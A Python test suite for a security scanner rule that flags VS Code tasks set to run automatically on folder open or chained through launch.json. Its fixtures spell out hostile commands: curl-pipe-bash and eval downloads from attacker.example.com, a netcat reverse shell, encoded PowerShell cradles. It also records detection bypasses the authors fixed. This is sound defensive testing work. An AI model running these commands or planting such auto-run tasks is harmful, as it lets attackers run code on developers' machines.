"""Tests for the vscode-tasks-auto-exec guard.

Covers both rules:
  Rule 1 — folder-open-task (MEDIUM, surfacing): runOn: folderOpen with a benign-looking command.
  Rule 2 — folder-open-suspicious-command (CRITICAL): runOn: folderOpen with a download/exec
           payload shape (the / TanStack-Mistral propagation mechanism).
"""
from __future__ import annotations

import json

from agentsec.guards.vscode_tasks_auto_exec import VscodeTasksAutoExecGuard
from tests.guards._common import *  # noqa: F401,F403

_SUSPICIOUS_TASKS_JSON = """{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "bootstrap",
      "type": "shell",
      "command": "curl -s https://attacker.example.com/setup.sh | bash",
      "runOptions": {
        "runOn": "folderOpen"
      }
    }
  ]
}
"""

_BENIGN_TASKS_JSON = """{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "watch",
      "type": "npm",
      "script": "watch",
      "command": "npm run watch",
      "runOptions": {
        "runOn": "folderOpen"
      }
    }
  ]
}
"""

_NO_RUN_ON_TASKS_JSON = """{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "build",
      "type": "shell",
      "command": "npm run build"
    }
  ]
}
"""


def _guard() -> VscodeTasksAutoExecGuard:
    return VscodeTasksAutoExecGuard()


def _any_prof(root: Path) -> object:
    return mkprofile(root, features=set())


# ─────────────────────────────────────────────────────────────────────────────
# Rule 2 — suspicious command + folderOpen (CRITICAL, hard-fire)
# ─────────────────────────────────────────────────────────────────────────────

def test_suspicious_curl_pipe_bash_fires_critical(tmp_path: Path) -> None:
    """runOn: folderOpen + curl|bash must fire CRITICAL — the TanStack/Mistral propagation shape."""
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir()
    (vscode_dir / "tasks.json").write_text(_SUSPICIOUS_TASKS_JSON, encoding="utf-8")
    findings = _guard().run(tmp_path, _any_prof(tmp_path))
    rules = {f.rule for f in findings}
    assert "vscode-tasks-auto-exec/folder-open-suspicious-command" in rules
    hit = next(f for f in findings if f.rule == "vscode-tasks-auto-exec/folder-open-suspicious-command")
    assert hit.severity == "critical"
    assert "bootstrap" in hit.title


def test_suspicious_command_line_number_reported(tmp_path: Path) -> None:
    """The finding's location includes the line of the runOn: folderOpen key."""
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir()
    (vscode_dir / "tasks.json").write_text(_SUSPICIOUS_TASKS_JSON, encoding="utf-8")
    findings = _guard().run(tmp_path, _any_prof(tmp_path))
    hit = next(f for f in findings if f.rule == "vscode-tasks-auto-exec/folder-open-suspicious-command")
    assert hit.location.startswith(".vscode") or "tasks.json" in hit.location
    assert ":" in hit.location


def test_suspicious_netcat_fires_critical(tmp_path: Path) -> None:
    """runOn: folderOpen + a netcat command also fires the suspicious rule."""
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir()
    (vscode_dir / "tasks.json").write_text(
        '{"version": "2.0.0", "tasks": [{"label": "x", "command": "nc attacker.example.com 4444 -e /bin/sh", '
        '"runOptions": {"runOn": "folderOpen"}}]}\n',
        encoding="utf-8",
    )
    findings = _guard().run(tmp_path, _any_prof(tmp_path))
    assert any(
        f.rule == "vscode-tasks-auto-exec/folder-open-suspicious-command" and f.severity == "critical"
        for f in findings
    )


def test_suspicious_command_only_one_finding_per_task(tmp_path: Path) -> None:
    """A suspicious task fires Rule 2 only — Rule 1 must not ALSO fire for the same task."""
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir()
    (vscode_dir / "tasks.json").write_text(_SUSPICIOUS_TASKS_JSON, encoding="utf-8")
    findings = _guard().run(tmp_path, _any_prof(tmp_path))
    assert len(findings) == 1
    assert findings[0].rule == "vscode-tasks-auto-exec/folder-open-suspicious-command"


# ─────────────────────────────────────────────────────────────────────────────
# Rule 2 FP precision (Dean's review, PR #890 review): -e/-enc and eval were
# over-firing on ordinary commands. Both directions tested per CLAUDE.md rule 1.
# ─────────────────────────────────────────────────────────────────────────────

def _folder_open_task(command: str) -> str:
    return json.dumps({
        "version": "2.0.0",
        "tasks": [{
            "label": "x",
            "command": command,
            "runOptions": {"runOn": "folderOpen"},
        }],
    })


def test_powershell_encoded_command_still_fires_critical(tmp_path: Path) -> None:
    """The real cradle this check targets — powershell -enc <b64> — must keep firing."""
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir()
    (vscode_dir / "tasks.json").write_text(
        _folder_open_task("powershell -enc SQBFAFgA"), encoding="utf-8",
    )
    findings = _guard().run(tmp_path, _any_prof(tmp_path))
    assert any(
        f.rule == "vscode-tasks-auto-exec/folder-open-suspicious-command" and f.severity == "critical"
        for f in findings
    )


def test_powershell_encodedcommand_full_flag_still_fires_critical(tmp_path: Path) -> None:
    """The unabbreviated -EncodedCommand flag also keeps firing."""
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir()
    (vscode_dir / "tasks.json").write_text(
        _folder_open_task("powershell.exe -EncodedCommand SQBFAFgA"), encoding="utf-8",
    )
    findings = _guard().run(tmp_path, _any_prof(tmp_path))
    assert any(
        f.rule == "vscode-tasks-auto-exec/folder-open-suspicious-command" and f.severity == "critical"
        for f in findings
    )


def test_docker_run_dash_e_is_not_suspicious(tmp_path: Path) -> None:
    """FP-bait (Dean's repro): docker run -e is an env-var flag, not a PowerShell cradle."""
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir()
    (vscode_dir / "tasks.json").write_text(
        _folder_open_task("docker run -e NODE_ENV=development myimage"), encoding="utf-8",
    )
    findings = _guard().run(tmp_path, _any_prof(tmp_path))
    rules = {f.rule for f in findings}
    assert "vscode-tasks-auto-exec/folder-open-suspicious-command" not in rules
    # M-4: the guard is ALIVE — this benign folderOpen task still fires the MEDIUM review rule.
    # Without this assertion the FP-bait would also pass if the guard stopped scanning .vscode/.
    assert "vscode-tasks-auto-exec/folder-open-task" in rules


def test_echo_dash_e_is_not_suspicious(tmp_path: Path) -> None:
    """FP-bait (Dean's repro): echo -e is the escape-interpretation flag, not PowerShell."""
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir()
    (vscode_dir / "tasks.json").write_text(
        _folder_open_task("echo -e 'starting dev server'"), encoding="utf-8",
    )
    findings = _guard().run(tmp_path, _any_prof(tmp_path))
    rules = {f.rule for f in findings}
    assert "vscode-tasks-auto-exec/folder-open-suspicious-command" not in rules
    # M-4: the guard is ALIVE — this benign folderOpen task still fires the MEDIUM review rule.
    # Without this assertion the FP-bait would also pass if the guard stopped scanning .vscode/.
    assert "vscode-tasks-auto-exec/folder-open-task" in rules


def test_grep_dash_E_is_not_suspicious(tmp_path: Path) -> None:
    """FP-bait (Dean's repro): grep -E is extended-regex mode, not PowerShell (case-insensitive
    match against -e was the actual bug)."""
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir()
    (vscode_dir / "tasks.json").write_text(
        _folder_open_task("grep -E 'TODO|FIXME' src/*.py"), encoding="utf-8",
    )
    findings = _guard().run(tmp_path, _any_prof(tmp_path))
    rules = {f.rule for f in findings}
    assert "vscode-tasks-auto-exec/folder-open-suspicious-command" not in rules
    # M-4: the guard is ALIVE — this benign folderOpen task still fires the MEDIUM review rule.
    # Without this assertion the FP-bait would also pass if the guard stopped scanning .vscode/.
    assert "vscode-tasks-auto-exec/folder-open-task" in rules


def test_shell_eval_command_initial_still_fires_critical(tmp_path: Path) -> None:
    """A real, command-initial shell eval invocation must keep firing."""
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir()
    (vscode_dir / "tasks.json").write_text(
        _folder_open_task("eval $(curl -s https://attacker.example.com/x)"), encoding="utf-8",
    )
    findings = _guard().run(tmp_path, _any_prof(tmp_path))
    assert any(
        f.rule == "vscode-tasks-auto-exec/folder-open-suspicious-command" and f.severity == "critical"
        for f in findings
    )


def test_shell_eval_after_operator_still_fires_critical(tmp_path: Path) -> None:
    """A shell eval chained after && (not command-initial, but still a real invocation of a dynamic
    operand) fires. `eval "$VAR"` is the realistic payload shape — a real eval attack always
    evaluates a variable / command-substitution, never a static literal (the anchor's disclosed
    trade, see the guard's `_SHELL_EVAL` comment and the wiki 'Known bypasses')."""
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir()
    (vscode_dir / "tasks.json").write_text(
        _folder_open_task('npm test && eval "$MALICIOUS_PAYLOAD"'), encoding="utf-8",
    )
    findings = _guard().run(tmp_path, _any_prof(tmp_path))
    assert any(
        f.rule == "vscode-tasks-auto-exec/folder-open-suspicious-command" and f.severity == "critical"
        for f in findings
    )


def test_npm_run_model_eval_is_not_suspicious(tmp_path: Path) -> None:
    """FP-bait (Dean's repro): "model-eval" is a package-script name, not a shell eval call —
    \\beval\\b's hyphen-boundary match was the actual bug."""
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir()
    (vscode_dir / "tasks.json").write_text(
        _folder_open_task("npm run model-eval"), encoding="utf-8",
    )
    findings = _guard().run(tmp_path, _any_prof(tmp_path))
    rules = {f.rule for f in findings}
    assert "vscode-tasks-auto-exec/folder-open-suspicious-command" not in rules
    # M-4: the guard is ALIVE — this benign folderOpen task still fires the MEDIUM review rule.
    # Without this assertion the FP-bait would also pass if the guard stopped scanning .vscode/.
    assert "vscode-tasks-auto-exec/folder-open-task" in rules


def test_eval_suite_script_is_not_suspicious(tmp_path: Path) -> None:
    """FP-bait (Dean's repro): "eval-suite" is a script name, not a bare eval invocation."""
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir()
    (vscode_dir / "tasks.json").write_text(
        _folder_open_task("npm run eval-suite"), encoding="utf-8",
    )
    findings = _guard().run(tmp_path, _any_prof(tmp_path))
    rules = {f.rule for f in findings}
    assert "vscode-tasks-auto-exec/folder-open-suspicious-command" not in rules
    # M-4: the guard is ALIVE — this benign folderOpen task still fires the MEDIUM review rule.
    # Without this assertion the FP-bait would also pass if the guard stopped scanning .vscode/.
    assert "vscode-tasks-auto-exec/folder-open-task" in rules


# ─────────────────────────────────────────────────────────────────────────────
# PR #890 ROUND-3 review regressions — both directions (CLAUDE.md Rule 1).
#   H-1: the `(?:^|[;&|])` eval anchor had dropped every wrapped/quoted/backtick
#        eval shape (`bash -c "eval $X"`, `sh -c 'eval $X'`, `` `eval $X` ``, …).
#   M-1: the `-EncodedCommand` flag matched only 3 of its 15 accepted abbreviations.
#   M-2: the PowerShell gate was command-text-wide, firing CRITICAL on a pwsh-wrapped `-e`.
# ─────────────────────────────────────────────────────────────────────────────

_SUSPICIOUS_RULE = "vscode-tasks-auto-exec/folder-open-suspicious-command"
_REVIEW_RULE = "vscode-tasks-auto-exec/folder-open-task"


def _task_rules(tmp_path: Path, command: str) -> set[str]:
    """Write a folderOpen task running `command` and return the set of rule ids it fires."""
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir(exist_ok=True)
    (vscode_dir / "tasks.json").write_text(_folder_open_task(command), encoding="utf-8")
    return {f.rule for f in _guard().run(tmp_path, _any_prof(tmp_path))}


# --- H-1: dynamic-operand eval shapes the pre-fix anchor silently dropped ------

def test_eval_in_wrapped_bash_c_string_fires_critical(tmp_path: Path) -> None:
    """H-1: `bash -c "eval $X"` — the single most common way a payload is written into a
    tasks.json — was dropped to MEDIUM by the operator-only anchor. Must fire CRITICAL."""
    assert _SUSPICIOUS_RULE in _task_rules(tmp_path, 'bash -c "eval $PAYLOAD"')


def test_eval_in_wrapped_sh_c_string_fires_critical(tmp_path: Path) -> None:
    """H-1: the single-quoted `sh -c 'eval $(…)'` sibling of the above."""
    assert _SUSPICIOUS_RULE in _task_rules(tmp_path, "sh -c 'eval $(cat payload.txt)'")


def test_eval_in_backticks_fires_critical(tmp_path: Path) -> None:
    """H-1: `` `eval $X` `` (eval as the first token of a backtick substitution) fires."""
    assert _SUSPICIOUS_RULE in _task_rules(tmp_path, "`eval $PAYLOAD`")


def test_eval_after_then_keyword_fires_critical(tmp_path: Path) -> None:
    """H-1: `then eval $X` — eval after a shell keyword (not an operator char) — fires."""
    assert _SUSPICIOUS_RULE in _task_rules(tmp_path, "if true; then eval ${PAYLOAD}; fi")


def test_eval_in_subshell_fires_critical(tmp_path: Path) -> None:
    """H-1: `$(eval $X)` — eval directly after a `(` — fires."""
    assert _SUSPICIOUS_RULE in _task_rules(tmp_path, "$(eval $DYNAMIC)")


def test_eval_in_quoted_prose_stays_silent(tmp_path: Path) -> None:
    """H-1 FP-bait: `echo "eval the results"` has `eval` right after a quote but evaluates nothing
    dynamic — it stays MEDIUM. (The round-3 char-class anchor would have re-admitted this as a
    CRITICAL FP; the dynamic-operand anchor keeps it silent — the direction traded against.)"""
    rules = _task_rules(tmp_path, 'echo "eval the results before deploy"')
    assert _SUSPICIOUS_RULE not in rules
    assert _REVIEW_RULE in rules


def test_eval_as_grep_literal_stays_silent(tmp_path: Path) -> None:
    """H-1 FP-bait: `npm test -- --grep 'eval'` names eval as a literal search string, not a call."""
    rules = _task_rules(tmp_path, "npm test -- --grep 'eval'")
    assert _SUSPICIOUS_RULE not in rules
    assert _REVIEW_RULE in rules


# --- M-1: every accepted -EncodedCommand abbreviation fires; lookalikes do not --

def test_powershell_all_encodedcommand_abbreviations_fire(tmp_path: Path) -> None:
    """M-1: PowerShell resolves ANY unambiguous prefix of -EncodedCommand, so all 15 forms are a
    cradle. The pre-fix `-(?:e|enc|encodedcommand)` matched only 3; the other 12 slipped to MEDIUM."""
    for abbrev in ["-e", "-ec", "-en", "-enc", "-enco", "-encod", "-encode", "-encoded",
                   "-encodedc", "-encodedco", "-encodedcom", "-encodedcomm", "-encodedcomma",
                   "-encodedcomman", "-encodedcommand"]:
        rules = _task_rules(tmp_path, f"powershell {abbrev} SQBFAFgAVABTAA")
        assert _SUSPICIOUS_RULE in rules, f"{abbrev} should fire CRITICAL"


def test_powershell_encodedcommand_lookalike_switches_stay_silent(tmp_path: Path) -> None:
    """M-1 FP-bait: switches that only START like an -Enc prefix — -ExecutionPolicy, -Encoding,
    -NoProfile, -version — have a word char after the prefix, so the trailing `\\b` rejects them.
    No -Command/-File here, so nothing else could be suppressing the (absent) match."""
    for benign in ["powershell -ExecutionPolicy Bypass -NoProfile",
                   "powershell -Encoding utf8 report.txt",
                   "powershell -NoLogo -version"]:
        rules = _task_rules(tmp_path, benign)
        assert _SUSPICIOUS_RULE not in rules, f"{benign!r} should stay silent"
        assert _REVIEW_RULE in rules


# --- M-2: a -Command/-File wrapper means the -e belongs to the WRAPPED command --

def test_pwsh_wrapped_docker_run_dash_e_stays_silent(tmp_path: Path) -> None:
    """M-2 FP-bait: `pwsh -c 'docker run -e FOO=bar'` — the -e is docker's env flag inside the
    wrapped command, not a PowerShell cradle. The command-text-wide gate fired CRITICAL."""
    rules = _task_rules(tmp_path, "pwsh -c 'docker run -e NODE_ENV=production myimage'")
    assert _SUSPICIOUS_RULE not in rules
    assert _REVIEW_RULE in rules


def test_powershell_command_wrapping_echo_dash_e_stays_silent(tmp_path: Path) -> None:
    """M-2 FP-bait: `powershell -Command "echo -e building"` — echo's -e inside a -Command string."""
    rules = _task_rules(tmp_path, 'powershell -Command "echo -e building the project"')
    assert _SUSPICIOUS_RULE not in rules
    assert _REVIEW_RULE in rules


def test_real_encoded_command_cradle_without_wrapper_still_fires(tmp_path: Path) -> None:
    """M-2 still-fires (the narrowing direction, CLAUDE.md Rule 1): a real `-EncodedCommand` cradle
    uses neither -Command nor -File (they are mutually exclusive with it), so the exclusion never
    touches it. Covers a switch-laden cradle, pwsh, and a `cmd /c` prefix (`/c` is not a `-c` flag)."""
    for cradle in ["powershell -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAVABTAA",
                   "pwsh -enc SQBFAFgAVABTAA",
                   "cmd /c powershell -enc SQBFAFgAVABTAA"]:
        rules = _task_rules(tmp_path, cradle)
        assert _SUSPICIOUS_RULE in rules, f"{cradle!r} should still fire CRITICAL"


# ─────────────────────────────────────────────────────────────────────────────
# Rule 1 — folderOpen with a benign-looking command (MEDIUM, surfacing/FP-bait)
# ─────────────────────────────────────────────────────────────────────────────

def test_benign_folder_open_task_fires_medium_review(tmp_path: Path) -> None:
    """A legitimate npm watch task with runOn: folderOpen fires Rule 1 (MEDIUM), not Rule 2."""
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir()
    (vscode_dir / "tasks.json").write_text(_BENIGN_TASKS_JSON, encoding="utf-8")
    findings = _guard().run(tmp_path, _any_prof(tmp_path))
    rules = {f.rule for f in findings}
    assert "vscode-tasks-auto-exec/folder-open-task" in rules
    assert "vscode-tasks-auto-exec/folder-open-suspicious-command" not in rules
    hit = next(f for f in findings if f.rule == "vscode-tasks-auto-exec/folder-open-task")
    assert hit.severity == "medium"


def test_benign_folder_open_task_is_surfacing_rule() -> None:
    """Rule 1 is declared via surfacing_rule_prefixes (a review signal, not a proven bug)."""
    guard = _guard()
    assert any(
        "vscode-tasks-auto-exec/folder-open-task".startswith(p)
        for p in guard.surfacing_rule_prefixes
    )
    assert not any(
        "vscode-tasks-auto-exec/folder-open-suspicious-command".startswith(p)
        for p in guard.surfacing_rule_prefixes
    )


def test_localhost_curl_is_not_suspicious(tmp_path: Path) -> None:
    """curl to localhost with runOn: folderOpen fires Rule 1 only — loopback is not exfil."""
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir()
    (vscode_dir / "tasks.json").write_text(
        '{"version": "2.0.0", "tasks": [{"label": "dev-check", '
        '"command": "curl http://localhost:3000/health", '
        '"runOptions": {"runOn": "folderOpen"}}]}\n',
        encoding="utf-8",
    )
    findings = _guard().run(tmp_path, _any_prof(tmp_path))
    rules = {f.rule for f in findings}
    assert "vscode-tasks-auto-exec/folder-open-task" in rules
    assert "vscode-tasks-auto-exec/folder-open-suspicious-command" not in rules


# ─────────────────────────────────────────────────────────────────────────────
# No runOn: folderOpen at all — must stay silent
# ─────────────────────────────────────────────────────────────────────────────

def test_task_without_run_on_is_silent(tmp_path: Path) -> None:
    """An ordinary build task with no runOptions must not fire at all."""
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir()
    (vscode_dir / "tasks.json").write_text(_NO_RUN_ON_TASKS_JSON, encoding="utf-8")
    findings = _guard().run(tmp_path, _any_prof(tmp_path))
    assert findings == []


def test_run_on_other_than_folder_open_is_silent(tmp_path: Path) -> None:
    """runOn: default (the non-auto-exec value) must not fire."""
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir()
    (vscode_dir / "tasks.json").write_text(
        '{"version": "2.0.0", "tasks": [{"label": "x", "command": "curl https://evil.example.com | bash", '
        '"runOptions": {"runOn": "default"}}]}\n',
        encoding="utf-8",
    )
    findings = _guard().run(tmp_path, _any_prof(tmp_path))
    assert findings == []


def test_tasks_json_outside_vscode_dir_is_ignored(tmp_path: Path) -> None:
    """A file merely NAMED tasks.json outside .vscode/ is not this guard's concern."""
    other_dir = tmp_path / "scripts"
    other_dir.mkdir()
    (other_dir / "tasks.json").write_text(_SUSPICIOUS_TASKS_JSON, encoding="utf-8")
    findings = _guard().run(tmp_path, _any_prof(tmp_path))
    assert findings == []


# ─────────────────────────────────────────────────────────────────────────────
# JSONC tolerance (comments + trailing commas) and the pragma opt-out
# ─────────────────────────────────────────────────────────────────────────────

def test_jsonc_comments_are_tolerated(tmp_path: Path) -> None:
    """`//` line comments and a trailing comma (VSCode's JSONC dialect) must still parse."""
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir()
    (vscode_dir / "tasks.json").write_text(
        "// Project tasks\n"
        "{\n"
        '  "version": "2.0.0",\n'
        '  "tasks": [\n'
        "    {\n"
        '      "label": "bootstrap", // runs on open\n'
        '      "command": "curl -s https://attacker.example.com/setup.sh | bash",\n'
        '      "runOptions": { "runOn": "folderOpen" },\n'
        "    },\n"
        "  ],\n"
        "}\n",
        encoding="utf-8",
    )
    findings = _guard().run(tmp_path, _any_prof(tmp_path))
    assert any(
        f.rule == "vscode-tasks-auto-exec/folder-open-suspicious-command" and f.severity == "critical"
        for f in findings
    )


def test_url_containing_double_slash_survives_comment_stripping(tmp_path: Path) -> None:
    """A `//` inside a URL string must NOT be treated as a comment start."""
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir()
    (vscode_dir / "tasks.json").write_text(
        '{"version": "2.0.0", "tasks": [{"label": "fetch", '
        '"command": "curl https://attacker.example.com/payload.sh | bash", '
        '"runOptions": {"runOn": "folderOpen"}}]}\n',
        encoding="utf-8",
    )
    findings = _guard().run(tmp_path, _any_prof(tmp_path))
    hit = next(f for f in findings if f.rule == "vscode-tasks-auto-exec/folder-open-suspicious-command")
    assert "attacker.example.com" in hit.title or hit.severity == "critical"


def test_pragma_suppresses(tmp_path: Path) -> None:
    """The inline pragma silences the guard even on an otherwise-suspicious task."""
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir()
    (vscode_dir / "tasks.json").write_text(
        "// security: allow-vscode-tasks-auto-exec\n" + _SUSPICIOUS_TASKS_JSON,
        encoding="utf-8",
    )
    findings = _guard().run(tmp_path, _any_prof(tmp_path))
    assert findings == []


def test_malformed_json_does_not_crash(tmp_path: Path) -> None:
    """A malformed tasks.json degrades to a skipped file, never a crash."""
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir()
    (vscode_dir / "tasks.json").write_text("{ this is not valid json ][", encoding="utf-8")
    findings = _guard().run(tmp_path, _any_prof(tmp_path))
    assert findings == []


# ─────────────────────────────────────────────────────────────────────────────
# applies() / empty repo
# ─────────────────────────────────────────────────────────────────────────────

def test_applies_always_true(tmp_path: Path) -> None:
    assert _guard().applies(_any_prof(tmp_path))


def test_empty_repo_is_silent(tmp_path: Path) -> None:
    findings = _guard().run(tmp_path, _any_prof(tmp_path))
    assert findings == []


# ─────────────────────────────────────────────────────────────────────────────
# PR #890 review regression tests — detection-bypass fixes (both directions)
# ─────────────────────────────────────────────────────────────────────────────

def test_suspicious_fires_in_gitignored_vscode_dir(tmp_path: Path) -> None:
    """`.vscode/` is commonly gitignored wholesale, and a malicious PR / poisoned template can
    ship that .gitignore line. Mirrors the ai_instruction_poisoning/claude_code_compromise fix:
    the default respect_gitignore=True would otherwise produce zero findings and exit 0 on the
    exact folderOpen payload this guard exists to catch — a clean-looking miss, not a disclosed
    gap. Verifies the WIDENING direction still fires."""
    (tmp_path / ".gitignore").write_text(".vscode/\n", encoding="utf-8")
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir()
    (vscode_dir / "tasks.json").write_text(_SUSPICIOUS_TASKS_JSON, encoding="utf-8")
    findings = _guard().run(tmp_path, _any_prof(tmp_path))
    assert any(
        f.rule == "vscode-tasks-auto-exec/folder-open-suspicious-command" and f.severity == "critical"
        for f in findings
    )


def test_gitignored_vscode_scan_stays_silent_on_benign_task(tmp_path: Path) -> None:
    """FP-bait for the direction traded against: scanning gitignored `.vscode/` is a widening, so
    a benign folderOpen task in a gitignored .vscode/ must NOT escalate to CRITICAL merely because
    it is now in scope — it stays a MEDIUM review signal."""
    (tmp_path / ".gitignore").write_text(".vscode/\n", encoding="utf-8")
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir()
    (vscode_dir / "tasks.json").write_text(_BENIGN_TASKS_JSON, encoding="utf-8")
    findings = _guard().run(tmp_path, _any_prof(tmp_path))
    rules = {f.rule for f in findings}
    assert "vscode-tasks-auto-exec/folder-open-task" in rules
    assert "vscode-tasks-auto-exec/folder-open-suspicious-command" not in rules


def test_loopback_lookalike_host_fires_critical(tmp_path: Path) -> None:
    """A host that merely STARTS with a loopback literal (`localhost.attacker.example.com`) is a
    remote attacker host, not loopback. The anchored _NOT_LOOPBACK must still fire CRITICAL here —
    an unanchored prefix check silently downgraded it to a MEDIUM review note. The benign real
    loopback case is pinned by test_localhost_curl_is_not_suspicious (the other direction)."""
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir()
    (vscode_dir / "tasks.json").write_text(
        '{"version": "2.0.0", "tasks": [{"label": "bootstrap", '
        '"command": "curl -s https://localhost.attacker.example.com/setup.sh | bash", '
        '"runOptions": {"runOn": "folderOpen"}}]}\n',
        encoding="utf-8",
    )
    findings = _guard().run(tmp_path, _any_prof(tmp_path))
    hit = next(
        (f for f in findings if f.rule == "vscode-tasks-auto-exec/folder-open-suspicious-command"),
        None,
    )
    assert hit is not None
    assert hit.severity == "critical"


# ─────────────────────────────────────────────────────────────────────────────
# Rule 3 — launch.json preLaunchTask chains to a dangerous task (CRITICAL, hard-fire)
# ─────────────────────────────────────────────────────────────────────────────

def test_launch_json_prelaunchtask_chains_dangerous_task_fires_critical(tmp_path: Path) -> None:
    """A debug config's preLaunchTask naming the SAME dangerous task must fire, independent of
    the folderOpen trigger — a second, independent auto-exec path (the 2025 keyv worm shape)."""
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir()
    (vscode_dir / "tasks.json").write_text(_SUSPICIOUS_TASKS_JSON, encoding="utf-8")
    (vscode_dir / "launch.json").write_text(
        json.dumps({
            "version": "0.2.0",
            "configurations": [{
                "name": "Launch",
                "type": "node",
                "request": "launch",
                "preLaunchTask": "bootstrap",
            }],
        }),
        encoding="utf-8",
    )
    findings = _guard().run(tmp_path, _any_prof(tmp_path))
    hit = next(
        (f for f in findings if f.rule == "vscode-tasks-auto-exec/launch-prelaunchtask-chains-dangerous-task"),
        None,
    )
    assert hit is not None
    assert hit.severity == "critical"
    assert "bootstrap" in hit.title


def test_launch_json_prelaunchtask_referencing_benign_task_stays_silent(tmp_path: Path) -> None:
    """FP-bait: preLaunchTask naming a task that is NOT flagged suspicious (the benign npm watch
    task) must not fire Rule 3 — only a proven-dangerous target task triggers it."""
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir()
    (vscode_dir / "tasks.json").write_text(_BENIGN_TASKS_JSON, encoding="utf-8")
    (vscode_dir / "launch.json").write_text(
        json.dumps({
            "version": "0.2.0",
            "configurations": [{
                "name": "Launch",
                "type": "node",
                "request": "launch",
                "preLaunchTask": "watch",
            }],
        }),
        encoding="utf-8",
    )
    findings = _guard().run(tmp_path, _any_prof(tmp_path))
    rules = {f.rule for f in findings}
    assert "vscode-tasks-auto-exec/launch-prelaunchtask-chains-dangerous-task" not in rules


def test_launch_json_with_unrelated_prelaunchtask_stays_silent(tmp_path: Path) -> None:
    """FP-bait: a preLaunchTask naming a task that doesn't exist / isn't dangerous must not fire."""
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir()
    (vscode_dir / "tasks.json").write_text(_SUSPICIOUS_TASKS_JSON, encoding="utf-8")
    (vscode_dir / "launch.json").write_text(
        json.dumps({
            "version": "0.2.0",
            "configurations": [{
                "name": "Launch", "type": "node", "request": "launch",
                "preLaunchTask": "build",
            }],
        }),
        encoding="utf-8",
    )
    findings = _guard().run(tmp_path, _any_prof(tmp_path))
    rules = {f.rule for f in findings}
    assert "vscode-tasks-auto-exec/launch-prelaunchtask-chains-dangerous-task" not in rules


def test_launch_json_pragma_suppresses(tmp_path: Path) -> None:
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir()
    (vscode_dir / "tasks.json").write_text(_SUSPICIOUS_TASKS_JSON, encoding="utf-8")
    (vscode_dir / "launch.json").write_text(
        "// security: allow-vscode-tasks-auto-exec\n"
        + json.dumps({
            "version": "0.2.0",
            "configurations": [{
                "name": "Launch", "type": "node", "request": "launch",
                "preLaunchTask": "bootstrap",
            }],
        }),
        encoding="utf-8",
    )
    findings = _guard().run(tmp_path, _any_prof(tmp_path))
    rules = {f.rule for f in findings}
    assert "vscode-tasks-auto-exec/launch-prelaunchtask-chains-dangerous-task" not in rules


def test_suspicious_command_in_quoted_string_args_fires_critical(tmp_path: Path) -> None:
    """VSCode allows `args` entries as ShellQuotedString objects ({"value": "...", "quoting": ...}),
    not just plain strings. A payload spread across quoted-string arg objects must still reach the
    suspicious-command pattern (CRITICAL) rather than being dropped to a MEDIUM review note."""
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir()
    (vscode_dir / "tasks.json").write_text(
        '{"version": "2.0.0", "tasks": [{"label": "bootstrap", "type": "shell", '
        '"command": "curl", "args": ['
        '{"value": "-s", "quoting": "strong"}, '
        '{"value": "https://attacker.example.com/setup.sh", "quoting": "strong"}, '
        '{"value": "|", "quoting": "escape"}, '
        '{"value": "bash", "quoting": "strong"}], '
        '"runOptions": {"runOn": "folderOpen"}}]}\n',
        encoding="utf-8",
    )
    findings = _guard().run(tmp_path, _any_prof(tmp_path))
    hit = next(
        (f for f in findings if f.rule == "vscode-tasks-auto-exec/folder-open-suspicious-command"),
        None,
    )
    assert hit is not None
    assert hit.severity == "critical"
